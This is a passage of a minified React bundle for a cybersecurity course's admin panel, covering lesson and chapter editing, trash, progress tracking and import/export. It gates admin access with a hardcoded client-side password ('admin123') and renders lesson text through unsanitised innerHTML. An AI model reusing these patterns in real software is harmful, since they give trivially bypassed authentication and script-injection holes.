0 0 0-1 1v5a1 1 0 0 0 1 1Z",key:"w4yl2u"}],["path",{d:"M3 5a2 2 0 0 0 2 2h3",key:"f2jnh7"}],["path",{d:"M3 3v13a2 2 0 0 0 2 2h3",key:"k8epm1"}]],Es=le("folder-tree",vp);const bp=[["path",{d:"M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8",key:"5wwlr5"}],["path",{d:"M3 10a2 2 0 0 1 .709-1.528l7-6a2 2 0 0 1 2.582 0l7 6A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",key:"r6nss1"}]],Sp=le("house",bp);const xp=[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",ry:"2",key:"1m3agn"}],["circle",{cx:"9",cy:"9",r:"2",key:"af1f0g"}],["path",{d:"m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21",key:"1xmnt7"}]],jp=le("image",xp);const Tp=[["rect",{width:"7",height:"9",x:"3",y:"3",rx:"1",key:"10lvy0"}],["rect",{width:"7",height:"5",x:"14",y:"3",rx:"1",key:"16une8"}],["rect",{width:"7",height:"9",x:"14",y:"12",rx:"1",key:"1hutg5"}],["rect",{width:"7",height:"5",x:"3",y:"16",rx:"1",key:"ldoo1y"}]],yh=le("layout-dashboard",Tp);const Np=[["path",{d:"M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5",key:"1gvzjb"}],["path",{d:"M9 18h6",key:"x1upvd"}],["path",{d:"M10 22h4",key:"ceow96"}]],zs=le("lightbulb",Np);const Cp=[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]],Ap=le("lock",Cp);const Ep=[["path",{d:"M4 5h16",key:"1tepv9"}],["path",{d:"M4 12h16",key:"1lakjw"}],["path",{d:"M4 19h16",key:"1djgab"}]],zp=le("menu",Ep);const Op=[["path",{d:"M22 17a2 2 0 0 1-2 2H6.828a2 2 0 0 0-1.414.586l-2.202 2.202A.71.71 0 0 1 2 21.286V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2z",key:"18887p"}]],ph=le("message-square",Op);const wp=[["path",{d:"M13 21h8",key:"1jsn5i"}],["path",{d:"M21.174 6.812a1 1 0 0 0-3.986-3.987L3.842 16.174a2 2 0 0 0-.5.83l-1.321 4.352a.5.5 0 0 0 .623.622l4.353-1.32a2 2 0 0 0 .83-.497z",key:"1a8usu"}]],cn=le("pen-line",wp);const _p=[["path",{d:"M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z",key:"10ikf1"}]],Mp=le("play",_p);const Dp=[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"M12 5v14",key:"s699le"}]],gh=le("plus",Dp);const Hp=[["path",{d:"M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8",key:"v9h5vc"}],["path",{d:"M21 3v5h-5",key:"1q7to0"}],["path",{d:"M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16",key:"3uifl3"}],["path",{d:"M8 16H3v5",key:"1cv678"}]],kp=le("refresh-cw",Hp);const Rp=[["path",{d:"M15.2 3a2 2 0 0 1 1.4.6l3.8 3.8a2 2 0 0 1 .6 1.4V19a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2z",key:"1c8476"}],["path",{d:"M17 21v-7a1 1 0 0 0-1-1H8a1 1 0 0 0-1 1v7",key:"1ydtos"}],["path",{d:"M7 3v4a1 1 0 0 0 1 1h7",key:"t51u73"}]],Nh=le("save",Rp);const Up=[["path",{d:"m21 21-4.34-4.34",key:"14j7rj"}],["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}]],Pu=le("search",Up);const Lp=[["path",{d:"M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915",key:"1i5ecw"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]],so=le("settings",Lp);const Bp=[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]],Os=le("shield",Bp);const Yp=[["path",{d:"M21 10.656V19a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h12.344",key:"2acyp4"}],["path",{d:"m9 11 3 3L22 4",key:"1pflzl"}]],vh=le("square-check-big",Yp);const qp=[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",key:"afitv7"}]],Gp=le("square",qp);const Vp=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"6",key:"1vlfrh"}],["circle",{cx:"12",cy:"12",r:"2",key:"1c9p78"}]],Xp=le("target",Vp);const Qp=[["path",{d:"M10 11v6",key:"nco0om"}],["path",{d:"M14 11v6",key:"outv1u"}],["path",{d:"M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6",key:"miytrc"}],["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2",key:"e791ji"}]],un=le("trash-2",Qp);const Zp=[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",key:"wmoenq"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]],on=le("triangle-alert",Zp);const Kp=[["path",{d:"M9 14 4 9l5-5",key:"102s5s"}],["path",{d:"M4 9h10.5a5.5 5.5 0 0 1 5.5 5.5a5.5 5.5 0 0 1-5.5 5.5H11",key:"f3b9sd"}]],bh=le("undo-2",Kp);const Jp=[["path",{d:"M12 3v12",key:"1x0j5s"}],["path",{d:"m17 8-5-5-5 5",key:"7q97r8"}],["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}]],Wp=le("upload",Jp);const $p=[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["path",{d:"M16 3.128a4 4 0 0 1 0 7.744",key:"16gr8j"}],["path",{d:"M22 21v-2a4 4 0 0 0-3-3.87",key:"kshegd"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}]],Sh=le("users",$p);const Fp=[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]],ws=le("x",Fp),Ip="admin123",eo="cybersecurity-course-overrides",to="cybersecurity-course-trash",ai="cybersecurity-progress",Wl=z=>{const B=z.split(/\s+/).filter(Me=>Me.length>0).length,X=(z.match(/```[\s\S]*?```/g)||[]).length,m=(z.match(/<tip>[\s\S]*?<\/tip>/g)||[]).length,k=(z.match(/<warning>[\s\S]*?<\/warning>/g)||[]).length,W=(z.match(/\|.*\|.*\n\|[-\s|]+\|/g)||[]).length,ce=(z.match(/^##+ .+$/gm)||[]).length;return{wordCount:B,codeBlocks:X,tips:m,warnings:k,tables:W,headers:ce}},lo=z=>{const B=z.match(/(\d+)/);return B?parseInt(B[1]):0},xh=(z,B)=>`${z}-${B+1}`,Pp=({message:z,type:B,onClose:X})=>(F.useEffect(()=>{const m=setTimeout(X,3e3);return()=>clearTimeout(m)},[X]),s.jsxs("div",{className:`toast toast-${B}`,children:[B==="success"&&s.jsx(tl,{size:18}),B==="error"&&s.jsx(no,{size:18}),B==="warning"&&s.jsx(on,{size:18}),s.jsx("span",{children:z})]})),e1=({isOpen:z,title:B,message:X,onConfirm:m,onCancel:k,confirmText:W="Delete",isDangerous:ce=!0})=>z?s.jsx("div",{className:"modal-overlay",children:s.jsxs("div",{className:"modal-content",children:[s.jsxs("div",{className:"modal-header",children:[s.jsx(on,{size:24,className:ce?"text-danger":"text-warning"}),s.jsx("h3",{children:B})]}),s.jsx("p",{className:"modal-message",children:X}),s.jsxs("div",{className:"modal-actions",children:[s.jsx("button",{className:"modal-btn cancel",onClick:k,children:"Cancel"}),s.jsx("button",{className:`modal-btn ${ce?"danger":"confirm"}`,onClick:m,children:W})]})]})}):null,ao=({isOpen:z,title:B,children:X,onClose:m,onSave:k,saveText:W="Save"})=>z?s.jsx("div",{className:"modal-overlay",children:s.jsxs("div",{className:"modal-content modal-form",children:[s.jsxs("div",{className:"modal-header",children:[s.jsx("h3",{children:B}),s.jsx("button",{className:"modal-close",onClick:m,children:s.jsx(ws,{size:20})})]}),s.jsx("div",{className:"modal-body",children:X}),s.jsxs("div",{className:"modal-actions",children:[s.jsx("button",{className:"modal-btn cancel",onClick:m,children:"Cancel"}),s.jsxs("button",{className:"modal-btn save",onClick:k,children:[s.jsx(Nh,{size:16}),W]})]})]})}):null;function t1({courseData:z,isOpen:B,onClose:X}){const[m,k]=F.useState(!1),[W,ce]=F.useState(""),[Me,q]=F.useState(""),[C,ue]=F.useState("dashboard"),[Q,Te]=F.useState({}),[se,Ge]=F.useState(null),[Ve,mt]=F.useState(!1),[ve,st]=F.useState([]),[G,tt]=F.useState({chapters:[],deletedChapters:[],deletedLessons:{}}),[O,R]=F.useState({chapters:[],lessons:[]}),[D,H]=F.useState([]),[Ke,He]=F.useState({isOpen:!1,title:"",message:"",onConfirm:null}),[ft,pe]=F.useState(null),[De,Je]=F.useState(null),[Ne,S]=F.useState(!1),[_,K]=F.useState(null),[I,oe]=F.useState({id:"",title:"",description:""}),[f,j]=F.useState({id:"",title:"",duration:"",content:"",chapterId:""}),[w,U]=F.useState(""),[P,ie]=F.useState("order"),[re,lt]=F.useState(!1),[xe,Ht]=F.useState(new Set),[ll,Cl]=F.useState(!1),Ce=F.useCallback((o,T="success")=>{const b=Date.now();H(E=>[...E,{id:b,message:o,type:T}])},[]),al=F.useCallback(o=>{H(T=>T.filter(b=>b.id!==o))},[]);F.useEffect(()=>{const o=localStorage.getItem(ai);o&&st(JSON.parse(o));const T=localStorage.getItem(eo);if(T)try{tt(JSON.parse(T))}catch(E){console.error("Failed to parse overrides:",E)}const b=localStorage.getItem(to);if(b)try{R(JSON.parse(b))}catch(E){console.error("Failed to parse trash:",E)}},[B]);const dt=F.useCallback(o=>{tt(o),localStorage.setItem(eo,JSON.stringify(o))},[]),Wt=F.useCallback(o=>{R(o),localStorage.setItem(to,JSON.stringify(o))},[]),Xe=F.useMemo(()=>{if(!z)return{chapters:[]};let o=[...z.chapters];return G.chapters&&G.chapters.forEach(T=>{const b=o.findIndex(E=>E.id===T.id);b>=0?o[b]={...o[b],...T,lessons:T.lessons||o[b].lessons,_modified:!0}:o.push({...T,_new:!0})}),G.deletedChapters&&(o=o.filter(T=>!G.deletedChapters.includes(T.id))),G.deletedLessons&&(o=o.map(T=>{const b=G.deletedLessons[T.id]||[];return{...T,lessons:T.lessons.filter(E=>!b.includes(E.id))}})),o.sort((T,b)=>T.id-b.id),{...z,chapters:o}},[z,G]),ee=F.useMemo(()=>{const o=Xe.chapters,T=o.flatMap(Pe=>Pe.lessons),b=T.length,E=T.reduce((Pe,at)=>Pe+lo(at.duration),0);let M=0,V=0,$=0,fe=0,Ue=[],Ct=[],Be=[];const At=T.map(Pe=>{const at=Wl(Pe.content);return M+=at.wordCount,V+=at.codeBlocks,$+=at.tips,fe+=at.warnings,at.wordCount<200&&Ue.push(Pe),at.codeBlocks===0&&Ct.push(Pe),at.tips===0&&Be.push(Pe),{...Pe,...at}}),mi=b>0?Math.round(ve.length/b*100):0,Pl=o.map(Pe=>{const il=Pe.lessons.map(sl=>sl.id).filter(sl=>ve.includes(sl)).length;return{...Pe,completed:il,total:Pe.lessons.length,percent:Pe.lessons.length>0?Math.round(il/Pe.lessons.length*100):0}});return{totalChapters:o.length,totalLessons:b,totalDuration:E,totalWordCount:M,totalCodeBlocks:V,totalTips:$,totalWarnings:fe,avgWordCount:b>0?Math.round(M/b):0,completedCount:ve.length,completionPercent:mi,shortLessons:Ue,noCodeLessons:Ct,noTipLessons:Be,lessonStats:At,chapterProgress:Pl}},[Xe,ve]),ga=F.useMemo(()=>{let o=Xe.chapters.flatMap(T=>T.lessons.map(b=>({...b,chapterId:T.id,chapterTitle:T.title})));if(w){const T=w.toLowerCase();o=o.filter(b=>b.title.toLowerCase().includes(T)||b.content.toLowerCase().includes(T))}switch(P){case"words":o.sort((T,b)=>Wl(b.content).wordCount-Wl(T.content).wordCount);break;case"duration":o.sort((T,b)=>lo(b.duration)-lo(T.duration));break;default:o.sort((T,b)=>T.chapterId!==b.chapterId?T.chapterId-b.chapterId:T.id.localeCompare(b.id))}return o},[Xe,w,P]),va=F.useMemo(()=>{const o=localStorage.getItem("cybersecurity-last-accessed");return o?new Date(parseInt(o)).toLocaleString():"Never"},[B]),rn=o=>{o.preventDefault(),W===Ip?(k(!0),q("")):(q("Incorrect password"),ce(""))},_s=o=>{Te(T=>({...T,[o]:!T[o]}))},Ms=()=>{const o=Math.max(...Xe.chapters.map(T=>T.id),0);oe({id:o+1,title:"",description:""}),S(!0)},yt=()=>{if(!I.title.trim()){Ce("Chapter title is required","error");return}const o={id:parseInt(I.id),title:I.title.trim(),description:I.description.trim(),lessons:[]},T={...G,chapters:[...G.chapters||[],o]};dt(T),S(!1),oe({id:"",title:"",description:""}),Ce(`Chapter "${o.title}" created!`,"success")},si=o=>{const T=Xe.chapters.find(E=>E.id===o),b=T?T.lessons.length:0;j({id:xh(o,b),title:"",duration:"5 min",content:`## Introduction

Your lesson content here...

### Section 1

Content...

<tip>
💡 Add helpful tips here!
</tip>
`,chapterId:o}),K(o)},ci=()=>{if(!f.title.trim()){Ce("Lesson title is required","error");return}const o={id:f.id,title:f.title.trim(),duration:f.duration.trim()||"5 min",content:f.content},T=parseInt(f.chapterId),b=G.chapters?.find($=>$.id===T),E=z.chapters.find($=>$.id===T);let M;if(b)M=G.chapters.map($=>$.id===T?{...$,lessons:[...$.lessons||E?.lessons||[],o]}:$);else if(E)M=[...G.chapters||[],{...E,lessons:[...E.lessons,o]}];else{Ce("Chapter not found","error");return}const V={...G,chapters:M};dt(V),K(null),j({id:"",title:"",duration:"",content:"",chapterId:""}),Ce(`Lesson "${o.title}" created!`,"success")},ui=o=>{oe({id:o.id,title:o.title,description:o.description||""}),pe(o)},ba=()=>{const o=ft.id,T=G.chapters?.find(V=>V.id===o),b=z.chapters.find(V=>V.id===o);let E;T?E=G.chapters.map(V=>V.id===o?{...V,title:I.title.trim(),description:I.description.trim()}:V):E=[...G.chapters||[],{...b||{},id:o,title:I.title.trim(),description:I.description.trim(),lessons:b?.lessons||[]}];const M={...G,chapters:E};dt(M),pe(null),oe({id:"",title:"",description:""}),Ce("Chapter updated!","success")},fn=(o,T)=>{j({id:o.id,title:o.title,duration:o.duration,content:o.content,chapterId:T}),Je({...o,chapterId:T}),ue("editor"),lt(!0)},oi=()=>{const o=parseInt(De.chapterId),T=G.chapters?.find($=>$.id===o),b=z.chapters.find($=>$.id===o),E={id:f.id,title:f.title.trim(),duration:f.duration.trim(),content:f.content,_modified:!0};let M;if(T)M=G.chapters.map($=>{if($.id===o){const fe=$.lessons||b?.lessons||[],Ue=fe.findIndex(Be=>Be.id===E.id);let Ct;return Ue>=0?Ct=fe.map(Be=>Be.id===E.id?E:Be):(Ct=fe.map(At=>At.id===E.id?E:At),b?.lessons.find(At=>At.id===E.id)&&(Ct=b.lessons.map(At=>At.id===E.id?E:At))),{...$,lessons:Ct}}return $});else{const fe=(b?.lessons||[]).map(Ue=>Ue.id===E.id?E:Ue);M=[...G.chapters||[],{...b,lessons:fe}]}const V={...G,chapters:M};dt(V),Je(null),j({id:"",title:"",duration:"",content:"",chapterId:""}),Ce("Lesson saved!","success")},ri=(o,T)=>{const b=[...Xe.chapters],E=b.findIndex(V=>V.id===o);if(T==="up"&&E>0){const V=b[E].id;b[E].id=b[E-1].id,b[E-1].id=V}else if(T==="down"&&E<b.length-1){const V=b[E].id;b[E].id=b[E+1].id,b[E+1].id=V}const M={...G,chapters:b.map(V=>({...V,lessons:V.lessons}))};dt(M),Ce("Chapter reordered!","success")},fi=(o,T,b)=>{const E=Xe.chapters.find(Be=>Be.id===T);if(!E)return;const M=[...E.lessons],V=M.findIndex(Be=>Be.id===o);b==="up"&&V>0?[M[V],M[V-1]]=[M[V-1],M[V]]:b==="down"&&V<M.length-1&&([M[V],M[V+1]]=[M[V+1],M[V]]);const $=M.map((Be,At)=>({...Be,id:xh(T,At)})),fe=G.chapters?.find(Be=>Be.id===T);let Ue;fe?Ue=G.chapters.map(Be=>Be.id===T?{...Be,lessons:$}:Be):Ue=[...G.chapters||[],{...E,lessons:$}];const Ct={...G,chapters:Ue};dt(Ct),Ce("Lesson reordered!","success")},$l=o=>{He({isOpen:!0,title:"Delete Chapter?",message:`Are you sure you want to delete "${o.title}"? This will also delete ${o.lessons.length} lessons. This action moves items to trash.`,onConfirm:()=>{const T={...O,chapters:[...O.chapters,{...o,deletedAt:new Date().toISOString()}]};Wt(T);const b={...G,deletedChapters:[...G.deletedChapters||[],o.id]};dt(b),He({isOpen:!1}),Ce(`Chapter "${o.title}" moved to trash`,"success")}})},pt=(o,T)=>{He({isOpen:!0,title:"Delete Lesson?",message:`Are you sure you want to delete "${o.title}"? This action moves the lesson to trash.`,onConfirm:()=>{const b={...O,lessons:[...O.lessons,{...o,chapterId:T,deletedAt:new Date().toISOString()}]};Wt(b);const E={...G.deletedLessons};E[T]||(E[T]=[]),E[T].push(o.id);const M={...G,deletedLessons:E};dt(M),He({isOpen:!1}),Ge(null),Ce(`Lesson "${o.title}" moved to trash`,"success")}})},$t=o=>{const T={...O,chapters:O.chapters.filter(E=>E.id!==o.id)};Wt(T);const b={...G,deletedChapters:(G.deletedChapters||[]).filter(E=>E!==o.id)};dt(b),Ce(`Chapter "${o.title}" restored!`,"success")},gt=o=>{const T={...O,lessons:O.lessons.filter(M=>M.id!==o.id)};Wt(T);const b={...G.deletedLessons};b[o.chapterId]&&(b[o.chapterId]=b[o.chapterId].filter(M=>M!==o.id));const E={...G,deletedLessons:b};dt(E),Ce(`Lesson "${o.title}" restored!`,"success")},Ds=()=>{He({isOpen:!0,title:"Empty Trash?",message:"This will permanently delete all items in the trash. This action cannot be undone!",onConfirm:()=>{Wt({chapters:[],lessons:[]}),He({isOpen:!1}),Ce("Trash emptied","success")}})},Hs=o=>{Ht(T=>{const b=new Set(T);return b.has(o)?b.delete(o):b.add(o),b})},ks=()=>{const o=Xe.chapters.flatMap(T=>T.lessons.map(b=>b.id));Ht(new Set(o))},Sa=()=>{Ht(new Set)},xa=()=>{const o=[...new Set([...ve,...xe])];st(o),localStorage.setItem(ai,JSON.stringify(o)),Ce(`${xe.size} lessons marked as complete`,"success"),Ht(new Set),Cl(!1)},ja=()=>{const o=ve.filter(T=>!xe.has(T));st(o),localStorage.setItem(ai,JSON.stringify(o)),Ce(`${xe.size} lessons marked as incomplete`,"success"),Ht(new Set),Cl(!1)},nl=()=>{He({isOpen:!0,title:"Delete Selected Lessons?",message:`Are you sure you want to delete ${xe.size} lessons? They will be moved to trash.`,onConfirm:()=>{const o=Xe.chapters.flatMap(M=>M.lessons.filter(V=>xe.has(V.id)).map(V=>({...V,chapterId:M.id}))),T={...O,lessons:[...O.lessons,...o.map(M=>({...M,deletedAt:new Date().toISOString()}))]};Wt(T);const b={...G.deletedLessons};o.forEach(M=>{b[M.chapterId]||(b[M.chapterId]=[]),b[M.chapterId].push(M.id)});const E={...G,deletedLessons:b};dt(E),He({isOpen:!1}),Ht(new Set),Cl(!1),Ce(`${o.length} lessons moved to trash`,"success")}})},Ta=()=>{const o={exportDate:new Date().toISOString(),version:"1.0",courseData:Xe,overrides:G,progress:ve},T=new Blob([JSON.stringify(o,null,2)],{type:"application/json"}),b=URL.createObjectURL(T),E=document.createElement("a");E.href=b,E.download=`cybersecurity-course-${new Date().toISOString().split("T")[0]}.json`,E.click(),URL.revokeObjectURL(b),Ce("Course exported!","success")},Fl=o=>{const T=o.target.files[0];if(!T)return;const b=new FileReader;b.onload=E=>{try{const M=JSON.parse(E.target.result);M.overrides&&dt(M.overrides),M.progress&&(st(M.progress),localStorage.setItem(ai,JSON.stringify(M.progress))),Ce("Course imported successfully!","success")}catch{Ce("Failed to import: Invalid JSON file","error")}},b.readAsText(T),o.target.value=""},Rs=()=>{let o=`# ${Xe.title||"Cybersecurity Course"}

`;o+=`${Xe.subtitle||""}

---

`,Xe.chapters.forEach(M=>{o+=`# Chapter ${M.id}: ${M.title}

`,o+=`*${M.description}*

`,M.lessons.forEach(V=>{o+=`## ${V.title}

`,o+=`**Duration:** ${V.duration}

`,o+=V.content+`

`,o+=`---

`})});const T=new Blob([o],{type:"text/markdown"}),b=URL.createObjectURL(T),E=document.createElement("a");E.href=b,E.download=`cybersecurity-course-${new Date().toISOString().split("T")[0]}.md`,E.click(),URL.revokeObjectURL(b),Ce("Exported as Markdown!","success")},di=()=>{He({isOpen:!0,title:"Reset to Default?",message:"This will clear all your modifications and revert to the original course content. Progress will be preserved. This cannot be undone!",onConfirm:()=>{localStorage.removeItem(eo),localStorage.removeItem(to),tt({chapters:[],deletedChapters:[],deletedLessons:{}}),R({chapters:[],lessons:[]}),He({isOpen:!1}),Ce("Course reset to default","success")}})},dn=()=>{He({isOpen:!0,title:"Reset Progress?",message:"Are you sure you want to reset all progress? This cannot be undone.",onConfirm:()=>{localStorage.removeItem(ai),localStorage.removeItem("cybersecurity-last-accessed"),st([]),He({isOpen:!1}),Ce("Progress reset","success")}})},Il=()=>{const o={exportDate:new Date().toISOString(),completedLessons:ve,lastAccessed:va,completionPercent:ee.completionPercent,chapterProgress:ee.chapterProgress.map(M=>({id:M.id,title:M.title,completed:M.completed,total:M.total,percent:M.percent}))},T=new Blob([JSON.stringify(o,null,2)],{type:"application/json"}),b=URL.createObjectURL(T),E=document.createElement("a");E.href=b,E.download=`cybersecurity-progress-${new Date().toISOString().split("T")[0]}.json`,E.click(),URL.revokeObjectURL(b),Ce("Progress exported!","success")},hn=()=>{De?(navigator.clipboard.writeText(f.content),Ce("Content copied!","success")):se&&(navigator.clipboard.writeText(se.content),Ce("Content copied!","success"))},Na=o=>{const T=o.trim().split(`
`),b=[];let E=0,M=!1,V=[],$="";for(;E<T.length;){const fe=T[E];if(fe.startsWith("```")){M?(b.push(s.jsxs("div",{className:"admin-code-block",children:[s.jsx("div",{className:"admin-code-header",children:s.jsx("span",{children:$})}),s.jsx("pre",{children:V.join(`
`)})]},`code-${E}`)),M=!1):(M=!0,$=fe.slice(3).trim()||"text",V=[]),E++;continue}if(M){V.push(fe),E++;continue}if(fe.includes("<tip>")){let Ue=[];for(E++;E<T.length&&!T[E].includes("</tip>");)Ue.push(T[E]),E++;b.push(s.jsxs("div",{className:"admin-tip-box",children:[s.jsx(zs,{size:16}),s.jsx("span",{children:Ue.join(" ").replace("💡 ","")})]},`tip-${E}`)),E++;continue}if(fe.includes("<warning>")){let Ue=[];for(E++;E<T.length&&!T[E].includes("</warning>");)Ue.push(T[E]),E++;b.push(s.jsxs("div",{className:"admin-warning-box",children:[s.jsx(on,{size:16}),s.jsx("span",{children:Ue.join(" ").replace("⚠️ ","")})]},`warn-${E}`)),E++;continue}if(fe.startsWith("## ")){b.push(s.jsx("h2",{children:fe.slice(3)},`h2-${E}`)),E++;continue}if(fe.startsWith("### ")){b.push(s.jsx("h3",{children:fe.slice(4)},`h3-${E}`)),E++;continue}fe.trim()&&b.push(s.jsx("p",{dangerouslySetInnerHTML:{__html:fe.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,"<code>$1</code>")}},`p-${E}`)),E++}return b};if(!B)return null;if(!m)return s.jsx("div",{className:"admin-overlay",children:s.jsxs("div",{className:"admin-login-card",children:[s.jsxs("div",{className:"admin-login-header",children:[s.jsx("div",{className:"admin-login-icon",children:s.jsx(Ap,{size:32})}),s.jsx("h2",{children:"Admin Access"}),s.jsx("p",{children:"Enter password to continue"})]}),s.jsxs("form",{onSubmit:rn,children:[s.jsx("input",{type:"password",value:W,onChange:o=>ce(o.target.value),placeholder:"Enter password",className:"admin-password-input",autoFocus:!0}),Me&&s.jsxs("div",{className:"admin-password-error",children:[s.jsx(no,{size:14}),Me]}),s.jsxs("button",{type:"submit",className:"admin-login-btn",children:[s.jsx(Os,{size:18}),"Access Admin Panel"]})]}),s.jsx("button",{className:"admin-close-btn",onClick:X,children:s.jsx(ws,{size:20})})]})});const hi=[{id:"dashboard",label:"Dashboard",icon:yh},{id:"manage",label:"Manage",icon:so},{id:"content",label:"Content",icon:Es},{id:"progress",label:"Progress",icon:Sh},{id:"analytics",label:"Analytics",icon:dh},{id:"editor",label:"Editor",icon:cn},{id:"trash",label:"Trash",icon:un,badge:O.chapters.length+O.lessons.length}];return s.jsxs("div",{className:"admin-overlay",children:[s.jsx("div",{className:"toast-container",children:D.map(o=>s.jsx(Pp,{message:o.message,type:o.type,onClose:()=>al(o.id)},o.id))}),s.jsx(e1,{isOpen:Ke.isOpen,title:Ke.title,message:Ke.message,onConfirm:Ke.onConfirm,onCancel:()=>He({isOpen:!1})}),s.jsxs(ao,{isOpen:Ne,title:"Create New Chapter",onClose:()=>S(!1),onSave:yt,saveText:"Create Chapter",children:[s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Chapter Number"}),s.jsx("input",{type:"number",value:I.id,onChange:o=>oe({...I,id:o.target.value}),className:"form-input"})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Title *"}),s.jsx("input",{type:"text",value:I.title,onChange:o=>oe({...I,title:o.target.value}),placeholder:"Chapter title...",className:"form-input",autoFocus:!0})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Description"}),s.jsx("textarea",{value:I.description,onChange:o=>oe({...I,description:o.target.value}),placeholder:"Brief description...",className:"form-textarea",rows:3})]})]}),s.jsxs(ao,{isOpen:!!ft,title:"Edit Chapter",onClose:()=>pe(null),onSave:ba,children:[s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Title *"}),s.jsx("input",{type:"text",value:I.title,onChange:o=>oe({...I,title:o.target.value}),className:"form-input",autoFocus:!0})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Description"}),s.jsx("textarea",{value:I.description,onChange:o=>oe({...I,description:o.target.value}),className:"form-textarea",rows:3})]})]}),s.jsxs(ao,{isOpen:!!_,title:"Create New Lesson",onClose:()=>K(null),onSave:ci,saveText:"Create Lesson",children:[s.jsxs("div",{className:"form-row",children:[s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Lesson ID"}),s.jsx("input",{type:"text",value:f.id,onChange:o=>j({...f,id:o.target.value}),className:"form-input"})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Duration"}),s.jsx("input",{type:"text",value:f.duration,onChange:o=>j({...f,duration:o.target.value}),placeholder:"e.g., 10 min",className:"form-input"})]})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Title *"}),s.jsx("input",{type:"text",value:f.title,onChange:o=>j({...f,title:o.target.value}),placeholder:"Lesson title...",className:"form-input",autoFocus:!0})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Content (Markdown)"}),s.jsx("textarea",{value:f.content,onChange:o=>j({...f,content:o.target.value}),placeholder:"Lesson content in markdown...",className:"form-textarea form-textarea-code",rows:10})]})]}),s.jsxs("div",{className:"admin-container",children:[s.jsxs("div",{className:"admin-header",children:[s.jsxs("div",{className:"admin-header-title",children:[s.jsx(Os,{size:24}),s.jsx("span",{children:"Admin Panel"}),(G.chapters?.length>0||Object.keys(G.deletedLessons||{}).length>0)&&s.jsx("span",{className:"badge badge-modified",children:"Modified"})]}),s.jsx("button",{className:"admin-close-btn",onClick:X,children:s.jsx(ws,{size:24})})]}),s.jsx("div",{className:"admin-tabs",children:hi.map(o=>s.jsxs("button",{className:`admin-tab ${C===o.id?"active":""}`,onClick:()=>ue(o.id),children:[s.jsx(o.icon,{size:18}),s.jsx("span",{children:o.label}),o.badge>0&&s.jsx("span",{className:"tab-badge",children:o.badge})]},o.id))}),s.jsxs("div",{className:"admin-content",children:[C==="dashboard"&&s.jsxs("div",{className:"admin-dashboard",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(yh,{size:20}),s.jsx("span",{children:"Dashboard Overview"})]}),s.jsxs("div",{className:"admin-stats-grid",children:[s.jsxs("div",{className:"admin-stat-card",children:[s.jsx("div",{className:"admin-stat-icon chapters",children:s.jsx(Es,{size:24})}),s.jsxs("div",{className:"admin-stat-info",children:[s.jsx("span",{className:"admin-stat-value",children:ee.totalChapters}),s.jsx("span",{className:"admin-stat-label",children:"Chapters"})]})]}),s.jsxs("div",{className:"admin-stat-card",children:[s.jsx("div",{className:"admin-stat-icon 